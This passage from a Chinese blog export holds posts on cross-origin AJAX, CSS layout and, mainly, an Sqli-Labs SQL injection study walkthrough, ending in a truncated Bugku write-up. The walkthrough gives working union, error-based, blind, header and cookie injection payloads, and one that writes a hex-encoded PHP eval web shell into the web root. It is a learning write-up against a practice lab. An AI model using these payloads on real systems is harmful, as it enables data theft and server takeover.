$(\"#search\").click(function()&#123; $.ajax(&#123; type: \"GET\", url: \"service.php?number=\"+$(\"#keyword\").val(), dataType: \"jsonp\", jsonp: \"callback\", success: function(data)&#123; if(data.success)&#123; &#125;else&#123;...&#125; &#125;, error: function(jqXHR)&#123;...&#125; &#125;); &#125;);&#125;); 方法三：XHR2HTML5提供的XMLHttpRequest Level2已经实现跨域访问和其他新功能（IE10以下版本不支持） 只需在服务器端添加两句话即可： 12header(&apos;Access-Control-Allow-Origin:*&apos;);header(&apos;Access-Control-Allow-Methods:POST,GET&apos;); 方法四：CORSCORS：Cross-Origin Resource Sharing 1234567891011121314151617181920212223242526function createCORSRequest(method, url) &#123; var xhr = new XMLHttpRequest(); if (\"withCredentials\" in xhr) &#123; // \"withCredentials\"属性是XMLHTTPRequest2中独有的 xhr.open(method, url, true); &#125; else if (typeof XDomainRequest != \"undefined\") &#123; // 检测是否XDomainRequest可用 xhr = new XDomainRequest(); xhr.open(method, url); &#125; else &#123; // 看起来CORS根本不被支持 xhr = null; &#125; return xhr;&#125;var xhr = createCORSRequest('GET', url);if (!xhr) &#123; throw new Error('CORS not supported');&#125; 参考：CORS详解","categories":[],"tags":[{"name":"Ajax","slug":"Ajax","permalink":"http://yoursite.com/tags/Ajax/"}]},{"title":"深入学习CSS布局","slug":"深入学习CSS布局","date":"2018-11-12T04:45:16.000Z","updated":"2019-04-02T14:19:23.374Z","comments":true,"path":"2018/11/12/深入学习CSS布局/","link":"","permalink":"http://yoursite.com/2018/11/12/深入学习CSS布局/","excerpt":"","text":"0x00前言CSS是个神奇的东西，可以把一个简陋的网页修饰得十分高大上，同时对于初学者来说很好上手，几天就可以快速入门做出一些网页。但是实际上想把CSS里面的知识学透也不是一件容易的事，因为实现某种效果往往会有多种不同的方式，几个常见的属性结合在一起很有可能会得到意想不到的结果，这里面有很多东西要去考虑，需要多去练习和总结才能做到灵活运用。 0x01涉及到的一些基本属性position 值 描述 absolute 生成绝对定位的元素，相对于 static 定位(unpositioned)以外的第一个父元素进行定位。 元素的位置通过 “left”, “top”, “right” ,”bottom” 属性进行规定。 fixed 生成固定定位的元素，相对于浏览器窗口进行定位。 元素的位置通过 “left”, “top”, “right” , “bottom” 属性进行规定。 relative 生成相对定位的元素，相对于其正常位置进行定位。 因此，”left: 20px” 会向元素的 LEFT 位置添加 20 像素。 static 默认值。没有定位(unpositioned)，元素出现在正常的流中（忽略 top, bottom, left, right 或者 z-index 声明）。 inherit 规定应该从父元素继承 position 属性的值。 sticky 新增属性：粘性定位，该定位基于用户滚动的位置。它的行为就像 position:relative; 而当页面滚动超出目标区域时，它的表现就像 position:fixed; 它会固定在目标位置。（Internet Explorer, Edge 15 及更早 IE 版本不支持 sticky 定位。 Safari 需要使用 -webkit-prefix。） 如果绝对定位（position属性的值为absolute）的元素没有“positioned”祖先元素，那么它会相对于文档的 body 元素，并且随着页面滚动而移动。一个“positioned”元素是指 position 值不是 static 的元素。 display 值 描述 none 此元素不会被显示。 block 此元素将显示为块级元素，此元素前后会带有换行符。 inline 默认。此元素会被显示为内联元素，元素前后没有换行符。 inline-block 行内块元素。（CSS2.1 新增的值） list-item 此元素会作为列表显示。 run-in 此元素会根据上下文作为块级元素或内联元素显示。 table 此元素会作为块级表格来显示（类似 table），表格前后带有换行符。 inline-table 此元素会作为内联表格来显示（类似 table），表格前后没有换行符。 table-row-group 此元素会作为一个或多个行的分组来显示（类似 tbody）。 table-header-group 此元素会作为一个或多个行的分组来显示（类似 thead）。 table-footer-group 此元素会作为一个或多个行的分组来显示（类似 tfoot）。 table-row 此元素会作为一个表格行显示（类似 tr）。 table-column-group 此元素会作为一个或多个列的分组来显示（类似 colgroup）。 table-column 此元素会作为一个单元格列显示（类似 col） table-cell 此元素会作为一个表格单元格显示（类似 td 和 th） table-caption 此元素会作为一个表格标题显示（类似 caption） inherit 规定应该从父元素继承 display 属性的值。 还有一些有趣的display值戳这里 display 是CSS中最重要的用于控制布局的属性。每个元素都有一个默认的 display 值，这与元素的类型有关。对于大多数元素它们的默认值通常是 block 或 inline 。 常见的块级标签：div，p，form，ul，ol，h1~h6，table，dl，hr，address，fieldset，header，footer，section… 常见的行级标签：span，a，img，input，select，label，textarea，b或strong，i或em… float 值 描述 left 元素向左浮动。 right 元素向右浮动。 none 默认值。元素不浮动，并会显示在其在文本中出现的位置。 inherit 规定应该从父元素继承 float 属性的值。 float 属性定义元素在哪个方向浮动。以往这个属性总应用于图像，使文本围绕在图像周围，不过在 CSS 中，任何元素都可以浮动。浮动元素会生成一个块级框，而不论它本身是何种元素。 0x02弹性盒子–Flex Container附链接：阮一峰的flex布局教程 模型说明当元素表现为flex框时，他们沿着两个轴来布局： 主轴（main axis）是沿着flex元素放置的方向延伸的轴。该轴的开始和结束被称为main start和main end。 交叉轴（cross axis）是垂直于flex元素放置方向的轴。该轴的开始和结束被称为cross start和cross end。 设置了display：flex的元素被称为flex容器（flex container） 在flex容器中表现为柔性的盒子的元素被称为flex项。 容器属性flex-direction：用于指定主轴的方向 row：默认值，主轴为水平方向，起点在左端 row-reverse：主轴为水平方向，起点在右端 column：主轴为垂直方向，起点在上沿 column-reverse：主轴为垂直方向，起点在下沿 flex-wrap：用于定义换行方式 nowrap：（默认）不换行 ·wrap：换行，第一行在上方 ·wrap-reverse：换行，第一行在下方 flex-flow：flex-direction属性和flex-wrap属性的简写形式默认值为：row nowrap 。 justify-content：定义项目在主轴上的对齐方式。 flex-start：左对齐（默认值） flex-end：右对齐 center：居中 space-between：两端对齐，项目之间间隔相等 space-around：每个项目两侧的间隔相等 align-item：定义在交叉轴上的对齐方式 flex-start：交叉轴起点对齐 flex-end：交叉轴终点对齐 center：交叉轴中点对齐 stretch（默认值）：如果项目没有设置高度或设为auto，将占满整个容器的高度 baseline：项目的第一行文字的基线对齐 align-content：定义多轴线对齐方式如果项目只有一根轴线，该属性不起作用。 flex-start：与交叉轴起点对齐 flex-end：与交叉轴终点对齐 center：与交叉轴中点对齐 stretch：轴线占满整个交叉轴 space-between：与交叉轴两端对齐，轴线之间的间隔平均分布 space-around：每根轴线两侧的间隔都相等 项目属性order：定义项目的排列顺序数值越小，排列越靠前。 order: number; flex-grow：定义项目的放大比例默认值为0，即如果存在剩余空间，也不放大。 flex-grow: number; 如果所有项目的flex-grow属性都为1，则它们将等分剩余空间（如果有的话）；如果一个项目的flex-grow属性为2，其他项目都为1，则前者占据的剩余空间将比其他项多一倍。 flex-shrink：定义项目的缩小比例默认值为1，即如果空间不足，项目缩小。 flex-shrink: number; 如果所有项目的flex-shrink属性都为1，当空间不足时都等比例缩小。如果一个项目的flex-shrink属性为0，其他项目都为1，则空间不足时前者不缩小。 flex-basis定义在分配多余空间之前，项目占据的主轴空间。浏览器根据这个属性，计算主轴是否有多余空间。默认值为auto，即项目本来的大小。可以设置为跟width和height属性一样的值，即项目占据固定空间。 flex是flex-grow，flex-shrink和flex-basis的缩写，默认值为0，1，auto。 align-self允许单个项目有与其他项目不一样的对齐方式，可覆盖align-item值，默认为auto，表示继承父元素的align-item属性，如果没有父元素，则等同于stretch。 该属性可能取6个值，除了auto，其他都与align-items属性完全一致。 flex布局实例附flex实例教程 详见教程示例。 0x03基本居中布局 设置text-align: center;（水平居中，且只对行内元素和display为inline或inline-block的元素有效） 水平居中 行内元素水平居中text-align:center width:100px; margin:0 auto; 利用tabledisplay:table; margin:0 auto; 利用absolute+transform 12.parent&#123; position:relative; &#125;.child&#123; position:absolute; left:50%; tranform: translateX(-50%); &#125; 利用flex 12.parent&#123; display: flex; &#125;.child&#123; margin: 0 auto; &#125; 1.parent&#123; display:flex; justify-content:center; &#125; 垂直居中（除去使用absolute定位的一些其他方法） 使用flex+align-items 1234.parent&#123; display: flex; align-items: center;&#125; 使用table-cell+vertical-align 1234.parent&#123; display: table-cell; vaertical-align: middle;&#125; 单行内联元素垂直居中 1234#box&#123; height: 120px; line-height: 120px; /*把行高设成高度值*/&#125; 多行内联元素垂直居中 123456.parent&#123; height: 100px; display: flex; flex-direction: column; justify-content: center;&#125; 或者利用table表布局 12345678.parent&#123; display: table; height: 100px;&#125;.child&#123; display: table-cell; vertical-align: middle;&#125; 水平垂直居中对齐 使用绝对定位进行水平垂直居中 123456.parent&#123; position:relative; &#125;.child&#123; width:200px; height:100px; position:absolute; left:50%; top:50%; margin-left:-100px; margin-top:-50px; &#125;/*用translate与之类似*/.parent&#123; position:relative; &#125;.child&#123; width:200px; height:100px; position:absolute; left:50%; top:50%; transform(-50%,-50%); &#125; 另一种使用绝对定位的方法 12.parent&#123; position:relative; &#125;.child&#123; width:100px; height:100px; position:absolute; left:0; right:0; top:0; bottom:0; margin:auto; &#125; 如果改变left，right , top , bottom的值可以让元素向某个方向偏移。 绝对定位+CSS3（未知高度） 1234567.parent&#123; position:relative; &#125;.child&#123; position: absolute; top: 50%; left: 50%; transform: translate(-50%,-50%);&#125; 用table-cell实现 123456.parent&#123; display: table;&#125;.child&#123; display:table-cell; vertical-align: middle; text-align: center;&#125; 一个神奇的水平居中方法（利用float，position和clear的结合） 1234567891011121314151617181920212223&lt;style&gt; .parent&#123; width:300px; height:200px; border:1px solid red; &#125; /*设置父容器*/ .wrapper&#123; /*自适应内容的宽度*/ float: left; position: relative; left: 50%; /*先让wrapper位于父容器宽度一半地方*/ clear: both; /*避免让后面的wrapper左浮动后与当前wrapper位于同一行*/ &#125; .child&#123; position: relative; /*在当前元素上进行相对定位*/ left: -50%; /*左移元素自身宽度的一半*/ white-space: nowrap; border: 1px solid blue; &#125;&lt;/style&gt;&lt;div class=\"parent\"&gt; &lt;div class=\"wrapper\"&gt; &lt;div class=\"child\"&gt;这是第一个尝试&lt;/div&gt; &lt;/div&gt; &lt;div class=\"wrapper\"&gt; &lt;div class=\"child\"&gt;再试试这个&lt;/div&gt; &lt;/div&gt;&lt;/div&gt; flex实现 12345.parent&#123; display:flex; justify-content:center; /*横轴居中*/ align-items:center; /*纵轴居中*/&#125; flex/grid与marign:auto 1234567.parent&#123; height: 100vh; /*必须有高度*/ display: grid; /*或设成flex*/&#125;.child&#123; margin: auto;&#125; 多列布局参考链接 左列定宽，右列自适应float+margin-left实现12.left&#123; float:left; width:100px; &#125;.right&#123; margin-left:100px; &#125; float+overflow实现12.left&#123; width:100px; float:left;&#125;.right&#123; overflow:hidden; &#125; 设置right-fix盒子1234567891011&lt;style&gt; .left&#123; width:100px; float:left; &#125; .right-fix&#123; width:100%; margin-left:-100px; float:right; &#125; .right&#123; margin-left:100px; &#125;&lt;/style&gt;&lt;div class=\"parent\"&gt; &lt;div class=\"left\"&gt;&lt;/div&gt; &lt;div class=\"right-fix\"&gt; &lt;div class=\"right\"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 使用table实现123.parent&#123; display:table; table-layout:fixed; width:100%; &#125;.left&#123; width:100px; &#125;.right,.left&#123; display:table-cell; &#125; 使用flex实现123.parent&#123; display:flex; &#125;.left&#123; width:100px; &#125;.right&#123; flex:1; &#125; /*直接填补右侧空余宽度*/ 右列定宽，左列自适应float+margin实现12.left&#123; float:left; width:100%; margin-right:-100px; &#125;.right&#123; float:right; width:100px; &#125; 使用table实现123.parent&#123; display:table; table-layout:fixed; width:100%; &#125;.left&#123; display:table-cell; &#125;.right&#123; width:100px; display:table-cell; &#125; 使用flex实现123.parent&#123; display:flex; &#125;.left&#123; flex:1; &#125;.right&#123; width:100px; &#125; 两侧定宽，中间栏自适应float+margin实现（有异议）123.left&#123; width：100px; float:left; &#125;.center&#123; float:left; width:100%; margin-right:-200px; &#125;.right&#123; width:100px; float:right; &#125; 用table实现123.parent&#123; width:100%; display:table; table-layout:fixed &#125;.left,.middle,.right&#123; display:table-cell; &#125;.left,.right&#123; width:100px; &#125; 用flex实现123.parent&#123; display:flex; &#125;.left,.right&#123; width:100px; &#125;.middle&#123; flex:1; &#125; 一列不定宽，一列自适应float+overflow实现12.left&#123; float:left; &#125;.right&#123; overflow:hidden; &#125; 用flex实现12.parent&#123; display:flex; &#125;.right&#123; flex:1; &#125; 多列等分布局float实现123456789&lt;style&gt; .parent&#123; margin-left:-20px &#125; /*假设列之间的间距为20px*/ .column&#123; float:left; width:25%; box-sizing:border-box; &#125;&lt;/style&gt;&lt;div class=\"parent\"&gt; &lt;div class=\"column\"&gt;1&lt;/div&gt; &lt;div class=\"column\"&gt;2&lt;/div&gt; &lt;div class=\"column\"&gt;3&lt;/div&gt;&lt;/div&gt; flex实现1234567.parent&#123; display:flex; &#125;.column&#123; flex:1; &#125;.column+.column&#123; margin-left:20px; &#125;/*另一种确定column宽度的情况*/.parent&#123; display:flex; justify-content:space-between; &#125;.column&#123; width:350px; &#125; 响应式布局参考资料","categories":[],"tags":[{"name":"前端","slug":"前端","permalink":"http://yoursite.com/tags/前端/"},{"name":"CSS","slug":"CSS","permalink":"http://yoursite.com/tags/CSS/"}]},{"title":"Sqli-Labs Study","slug":"Sqli-Labs-Study","date":"2018-08-31T04:14:22.000Z","updated":"2018-09-09T05:55:16.704Z","comments":true,"path":"2018/08/31/Sqli-Labs-Study/","link":"","permalink":"http://yoursite.com/2018/08/31/Sqli-Labs-Study/","excerpt":"","text":"Sqli-Labs注入学习笔记环境搭建 Ubuntu16.04+apache2+php5.6+mysql5.7 关于平台搭建的相关教程戳这里 搭建完成后进入localhost/sqli-labs-master，点链接看到map 再点Less-1，如果出现如下页面说明数据也已搭建完毕。 现在可以开始进行注入的学习了 Page-1(Basic Challenges)Less-1 GET-Error based-Single quotes-String localhost/sqli-labs-master/Less-1/?id=1&#39;出现报错：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1 发现已经闭合，直接加注释符即可注入。 ?id=1&#39; order by 2--+，?id=1&#39; order by 3--+均正常回显，order by 4报错，说明有三列。 ?id=-1&#39; union select database(),2,3--+发现回显为在2,3处，?id=-1&#39; union select 1,database(),3--+得库名security ?id=-1&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&quot;security&quot; limit 0,1--+改变limit范围共得到emails,referers,uagents,users四个表名。 还有一种更简单的办法：?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+ ?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&quot;security&quot; and table_name=&quot;users&quot;--+同理得到id,username,password三个字段名。 ?id=-1&#39; union select 1,group_concat(username),group_concat(password) from users--+得到十三组用户名密码。 12username:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4 Less-2 GET-Error based-integer based ?id=1&#39;报错：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’ LIMIT 0,1’ at line 1 发现这个已经闭合过了，再加一个单引号就会多出来。 所以同理直接构造id=-1 union select 1,username,password from users limit 0,1--+ Less-3 GET-Error based-Single quotes with twist-String ?id=1&#39;报错：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’) LIMIT 0,1’ at line 1 后面多了个括号。构造：?id=1&#39;) Less-4 GET-Error based-Double quotes-String ?id=1&#39;不报错，?id=1&quot;报错：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“1″”) LIMIT 0,1’ at line 1 构造：?id=1&quot;) Less-5 GET-Double injection-Single quotes-String ?id=1这次的页面和之前不太一样，没有出现回显位，所以不能像前几次那样构造了。 可以先看一下这篇博文：MYSQL注入天书之盲注讲解 ?id=1&#39;这里报错和Less-1里面的一样。 题目提示双注入：先了解一下 先查库名：?id=-1&#39; union select count(*),1,concat(&#39;~&#39;,(database()),&#39;~&#39;,floor(rand()*2))as a from information_schema.tables group by a--+回显Duplicate entry &#39;~security~1&#39; for key&quot; 也可以用extravalue报错的方法：?id=-1&#39; and extravalue(1,concat(0x7e,(select database()),0x7e))--+回显FUNCTION security.extractvalue does not exist ?id=-1&#39; union select count(*),1,concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),&#39;~&#39;,floor(rand()*2))as a from information_schema.tables group by a--+ 回显Duplicate entry &#39;~emails~0&#39; for key&quot; ?id=-1&#39; union select count(*),1,concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),&#39;~&#39;,floor(rand()*2))as a from information_schema.tables group by a--+回显Duplicate entry &#39;~users~1&#39; for key&quot; 直接查四个表的方法：?id=-1&#39; union select count(*),1,concat(&#39;~&#39;,(select (group_concat(table_name)) from information_schema.tables where table_schema=&#39;security&#39;),&#39;~&#39;,floor(rand()*2))a from information_schema.tables group by a--+ 查users表列名：?id=-1&#39; union select count(*),1,concat(&#39;~&#39;,(select (group_concat(column_name)) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),&#39;~&#39;,floor(rand()*2))a from information_schema.tables group by a--+ 查数据：?id=-1&#39; union select count(*),1,concat(&#39;~&#39;,(select concat_ws(char(32,44,32),id,username,password) from users limit 0,1),&#39;~&#39;,floor(rand()*2))a from information_schema.tables group by a--+ Less-6 GET-Double injection-Double quotes-String ?id=1&#39;不报错，?id=1&quot;报错：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“1”” LIMIT 0,1’ at line 1 ，把Less-5的payload中的单引号换成双引号即可。 Less-7 GET-Dump into outfile-String 先了解一下dumpfile的用法 还有 SQL注入写入一句话木马原理 首先要获取网站在系统中的具体路径，利用@@datadir (数据库路径) 和@@basedir (MYSQL安装路径)。 在Less-1注入得到数据库路径/var/lib/mysql/，安装路径/usr/ 试了?id=1&#39;、?id=1&quot;、?id=1&#39;)都不行，去看了下源码，发现用的双括号 1234567891011121314151617$sql=\"SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1\";$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; echo '&lt;font color= \"#FFFF00\"&gt;'; echo 'You are in.... Use outfile......'; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; &#125; else &#123; echo '&lt;font color= \"#FFFF00\"&gt;'; echo 'You have an error in your SQL syntax'; //print_r(mysql_error()); echo \"&lt;/font&gt;\"; &#125; ?id=-1&#39;)) union select 1,2,3c3f706870206576616c28245f504f53545b27636d64275d293b3f3e into outfile &#39;/var/www/html/cmd.php&#39;--+ ，这里的3c3f706870206576616c28245f504f53545b27636d64275d293b3f3e 是&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;的十六进制。最后再用菜刀连接。 Less-8 GET-Blind-Boolean based-Single quotes 基于布尔的盲注，可以借助substr()，left()，mid()等其他函数判断。 1.从左开始截取字符串：left(str, length)，即left(被截取字符串， 截取长度) 2.从右开始截取字符串：right(str, length)，即right(被截取字符串， 截取长度) 3.截取特定长度的字符串： substring(str, pos)，即：substring(被截取字符串， 从第几位开始截取) substring(str, pos, length)，即：substring(被截取字符串，从第几位开始截取，截取长度) 从字符串的倒数第6个字符开始读取，只取2个字符 1SELECT SUBSTRING(&apos;helloworld&apos;, -6, 2) 4.按关键字进行读取：substring_index(str, delim, count)，即substring_index(被截取字符串，关键字，关键字出现的次数) 截取第二个“.”之前的所有字符 1SELECT SUBSTRING_INDEX(&apos;www.baidu.com&apos;, &apos;.&apos;, 2); 截取倒数第二个“.”之后的所有字符 1SELECT SUBSTRING_INDEX(&apos;www.baidu.com&apos;, &apos;.&apos;, -2); 如果关键字不存在，则返回整个字符串 1SELECT SUBSTRING_INDEX(&apos;www.baidu.com&apos;, &apos;#&apos;, 1); 试着查库名：?id=1&#39; and substr(database(),1,1)&gt;&#39;a&#39;--+，若回显you are in说明库名的第一个字符在a之后，然后手工一个一个试就能试出第一个字符是啥，同理就可以试出整个库名。当然这样试很麻烦，用脚本跑会快很多。 类似地，构造?id=1&#39; and substr((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1)1,1)&gt;&#39;a&#39;--+可以试出表名。 或者利用ascii()和substr()函数构造：?id=1&#39; and ascii(substr((select database()),1,1))&gt;33--+ Less-9 GET-Blind-Time bases-Single quotes 基于时间的盲注：附链接 可以利用if()，sleep()，benchmark()函数进行盲注。 if(exp1,exp2,exp3)：当exp1为true时，执行exp2；否则执行exp3 sleep(seconds)：让代码执行延迟若干秒 benchmark(n,exp)：让表达式exp重复执行n次 查库名：?id=1&#39; and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+匹配的时候会直接返回，不匹配则需等待5秒。表名、列名、数据信息也可以通过这种方式查出。 Less-10 GET-Blind-Time based-Double quotes 将Less-9的payload里的单引号换成双引号即可。 Less-11 POST-Error based-Single quotes-String 变成post了，有俩输入框username和password，猜会用到万能密码。用户名输admin&#39;#密码随便填，回显用户admin登录，可以注入了 username：&#39; or 1=1 order by 2#回显正确，&#39; or 1=1 order by 3#报错，说明有两列 &#39; union select 1,database()#得库名 &#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&quot;security&quot;#得表名，查列名和数据同理。 （这里都是在username里注入，也可以利用已知的用户名admin在password里添加查询语句） Less-12 POST-Error based-Double quotes-String-with twist 这里构造方法和Less-11差不多，只需把单引号改成&quot;) Less-13 POST-Double injection-Single quotes-String-with twist 查库名：用户名输&#39; or &#39;1&#39;=&#39;1，密码输&#39;) or 1=1 and extractvalue(1,concat(0x7e,(select database()),0x7e))#，报错FUNCTION security.extractvalue does not exist 或者用户名输admin&#39;) and extractvalue(1,concat(0x7e,(select database()),0x7e))#，密码随便输，出现报错XPATH syntax error:&#39;~security~&#39; 查表名：用户名admin&#39;) and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&quot;security&quot;),0x7e))#，报错XPATH syntax error:&#39;~emails,referers,uagents,users~&#39; 查列名和数据同理。 Less-14 POST-Double injection-Single quotes-String-with twist 和Less-13类似，把&#39;)&#39;换成&quot; Less-15 POST-Blind-Boolean/time Based-Single quotes 基于布尔：用户名admin&#39; and substr(database(),1,1)&gt;&#39;a&#39;# 基于时间：用户名admin&#39; and if(ascii(substr(database(),1,1))=115,1,sleep(5))# Less-16 POST-Blind-Boolean/time Based-Double quotes 把Less-15里的单引号换成)&quot; 附源码 12345$uname='\"'.$uname.'\"'; $passwd='\"'.$passwd.'\"'; @$sql=\"SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); Less-17 POST-Update Query-Error based-String 关于Update Query：附链接 看下源码 1234567891011121314151617181920212223242526272829function check_input($value)&#123; if(!empty($value)) &#123; // truncation (see comments) $value = substr($value,0,15); &#125; // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) &#123; $value = stripslashes($value); &#125; // Quote if not a number if (!ctype_digit($value)) &#123; $value = \"'\" . mysql_real_escape_string($value) . \"'\"; &#125; else &#123; $value = intval($value); &#125; return $value;&#125;// take the variablesif(isset($_POST['uname']) &amp;&amp; isset($_POST['passwd']))&#123;//making sure uname is not injectable$uname=check_input($_POST['uname']); $passwd=$_POST['passwd']; addslashes()：返回在预定义字符（’,”,\\,NULL）前添加反斜杠的字符串 stripslashes()：删除addslashes()添加的反斜杠 mysql_real_escape_string()：转义SQL语句中字符串的特殊字符 发现了一个过滤函数，并且会检查输入的username，所以这次只能在password处构造 uname=admin&amp;passwd=&#39;and extractvalue(1,concat(0x7e,(select database()),0x7e))#&amp;submit=Submit 或者uname=admin&amp;passwd=&#39;or updatexml(1,concat(&#39;~&#39;,(select database()),&#39;~&#39;),0)#&amp;submit=Submit 查数据uname=admin&amp;passwd=&#39;or updatexml(1,concat(&#39;~&#39;,(select * from(select concat_ws(char(45),id,username,password)from users limit 0,1)as a),&#39;~&#39;),0)# Less-18 POST-Header injection-Uagent field-Error based 先看源码，贴一部分 123456789101112131415161718192021222324252627282930313233$uname = check_input($_POST['uname']);$passwd = check_input($_POST['passwd']);$sql=\"SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1\"; $result1 = mysql_query($sql); $row1 = mysql_fetch_array($result1); if($row1) &#123; echo '&lt;font color= \"#FFFF00\" font size = 3 &gt;'; $insert=\"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)\"; mysql_query($insert); //echo 'Your IP ADDRESS is: ' .$IP; echo \"&lt;/font&gt;\"; //echo \"&lt;br&gt;\"; echo '&lt;font color= \"#0000ff\" font size = 3 &gt;'; echo 'Your User Agent is: ' .$uagent; echo \"&lt;/font&gt;\"; echo \"&lt;br&gt;\"; print_r(mysql_error()); echo \"&lt;br&gt;&lt;br&gt;\"; echo '&lt;img src=\"../images/flag.jpg\" /&gt;'; echo \"&lt;br&gt;\"; &#125; else &#123; echo '&lt;font color= \"#0000ff\" font size=\"3\"&gt;'; //echo \"Try again looser\"; print_r(mysql_error()); echo \"&lt;/br&gt;\"; echo \"&lt;/br&gt;\"; echo '&lt;img src=\"../images/slap.jpg\" /&gt;'; echo \"&lt;/font&gt;\"; &#125; 这次在username和password处都对输入进行了过滤，但是往后看会发现$insert=&quot;INSERT INTO security.uagents (&#39;uagent&#39;, &#39;ip_address&#39;, &#39;username&#39;) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, &#39;$uname&#39;)&quot;; mysql_query($insert);这里提供了新的注入点，可以在$uagent或$IP里加查询语句，uagent相对好修改，直接用火狐浏览器插件hackbar里POST。 UA：&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#39;1&#39;=&#39;1 POST以后回显如图 Less-19 POST-Header injection-Referer field-Error based 和Less-18差不多，这次是修改referer。 Referer：&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#39;1&#39;=&#39;1 Less-20 POST-Cookie injection-Uagent field-Error based 这里需要在Cookie中构造查询语句，可以借助火狐插件Cookie Quick Manager修改cookie值 先用admin身份登录一下会产生一个cookie，尝试修改成uname=admin&#39; order by 3#不报错，改成4报错，一共有三列。 接着构造uname=admin&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e))#，回显如图 其他同理。 Less-21 POST-Dump into outfile-String 查看源码，发现了一些新东西 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364if(!isset($_POST['submit']))&#123; $cookee = $_COOKIE['uname']; $format = 'D d M Y - H:i:s'; $timestamp = time() + 3600; echo \"&lt;center&gt;\"; echo \"&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;b&gt;\"; echo '&lt;img src=\"../images/Less-21.jpg\" /&gt;'; echo \"&lt;br&gt;&lt;br&gt;&lt;b&gt;\"; echo '&lt;br&gt;&lt;font color= \"red\" font size=\"4\"&gt;'; echo \"YOUR USER AGENT IS : \".$_SERVER['HTTP_USER_AGENT']; echo \"&lt;/font&gt;&lt;br&gt;\"; echo '&lt;font color= \"cyan\" font size=\"4\"&gt;'; echo \"YOUR IP ADDRESS IS : \".$_SERVER['REMOTE_ADDR']; echo \"&lt;/font&gt;&lt;br&gt;\"; echo '&lt;font color= \"#FFFF00\" font size = 4 &gt;'; echo \"DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br&gt;\"; echo '&lt;font color= \"orange\" font size = 5 &gt;'; echo \"YOUR COOKIE : uname = $cookee and expires: \" . date($format, $timestamp); $cookee = base64_decode($cookee); echo \"&lt;br&gt;&lt;/font&gt;\"; $sql=\"SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1\"; $result=mysql_query($sql); if (!$result) &#123; die('Issue with your mysql: ' . mysql_error()); &#125; $row = mysql_fetch_array($result); if($row) &#123; echo '&lt;font color= \"pink\" font size=\"5\"&gt;'; echo 'Your Login name:'. $row['username']; echo \"&lt;br&gt;\"; echo '&lt;font color= \"grey\" font size=\"5\"&gt;'; echo 'Your Password:' .$row['password']; echo \"&lt;/font&gt;&lt;/b&gt;\"; echo \"&lt;br&gt;\"; echo 'Your ID:' .$row['id']; &#125; else &#123; echo \"&lt;center&gt;\"; echo '&lt;br&gt;&lt;br&gt;&lt;br&gt;'; echo '&lt;img src=\"../images/slap1.jpg\" /&gt;'; echo \"&lt;br&gt;&lt;br&gt;&lt;b&gt;\"; //echo '&lt;img src=\"../images/Less-20.jpg\" /&gt;'; &#125; echo '&lt;center&gt;'; echo '&lt;form action=\"\" method=\"post\"&gt;'; echo '&lt;input type=\"submit\" name=\"submit\" value=\"Delete Your Cookie!\" /&gt;'; echo '&lt;/form&gt;'; echo '&lt;/center&gt;';&#125; else&#123; echo '&lt;center&gt;'; echo \"&lt;br&gt;\"; echo '&lt;font color= \"#FFFF00\" font size = 6 &gt;'; echo \" Your Cookie is deleted\"; setcookie('uname', base64_encode($row1['username']), time()-3600); header ('Location: index.php'); echo '&lt;/font&gt;&lt;/center&gt;&lt;/br&gt;';&#125; Less-22 Future editions","categories":[],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://yoursite.com/tags/SQL/"}]},{"title":"Bugku SQL注入题目总结","slug":"Bugku-SQL注入题目总结","date":"2018-08-25T04:32:40.000Z","updated":"2018-09-09T03:09:50.319Z","comments":true,"path":"2018/08/25/Bugku-SQL注入题目总结/","link":"","permalink":"http://yoursite.com/2018/08/25/Bugku-SQL注入题目总结/","excerpt":"","text":"Bugku SQL注入题目总结sql注入查看源码发现网页编码为gb2312，猜测考的是宽字节注入。 关于宽字节注入可以参考大佬的详解：戳这里 果然输入?id=1%df&#39;出现了报错，说明已经可以注入了。1%df%27被转换成了1運，原因就是单引号前被添加了转义符\\，即%5c，在这里前面的%df和%5c结合形成了汉字，导致单引号成功逃逸。下面就可以直接操作了。 ?id=1%df&#39;and 